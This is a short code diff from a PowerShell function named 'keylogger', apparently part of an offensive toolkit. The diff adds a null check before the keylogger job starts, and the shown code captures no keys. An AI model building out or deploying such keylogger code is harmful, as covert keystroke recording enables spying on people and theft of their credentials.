@@ -1,5 +1,5 @@
 function keylogger{
-    if($GLOBAL:joblist["keylogger"] -eq "")
+    if($GLOBAL:joblist["keylogger"] -eq $nul -or $GLOBAL:joblist["keylogger"] -eq "")
     {
         $set = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
         $word = "\"
